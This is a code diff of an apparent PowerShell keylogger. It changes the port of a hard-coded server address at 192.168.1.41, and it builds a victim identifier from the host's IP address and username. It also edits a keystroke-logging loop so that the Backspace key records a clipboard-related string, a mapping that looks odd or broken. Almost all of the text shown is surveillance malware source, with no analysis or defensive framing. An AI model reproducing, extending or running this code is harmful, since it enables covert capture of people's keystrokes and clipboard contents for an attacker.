@@ -1,5 +1,5 @@
 
-$server = 'http://192.168.1.41:4444/'
+$server = 'http://192.168.1.41:5555/'
 $ip		= get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
 $user 	= (whoami).split('\')[1]
 $id 	= $ip.ipaddress[0]+'.'+$user
@@ -134,7 +134,7 @@ while ($true) {
 			if ($SpaceBar)     {$Outout += '[SpaceBar]'}
 			if ($DeleteKey)    {$Outout += '[Delete]'}
 			if ($EnterKey)     {$Outout += '[Enter]'}
-			if ($BackSpaceKey) {$Outout += '[get-clipboard]'}
+			if ($BackSpaceKey) {$Outout += '[(get-clipboard)]'}
 			if ($LeftArrow)    {$Outout += '[Left Arrow]'}
 			if ($RightArrow)   {$Outout += '[Right Arrow]'}
 			if ($UpArrow)      {$Outout += '[Up Arrow]'}
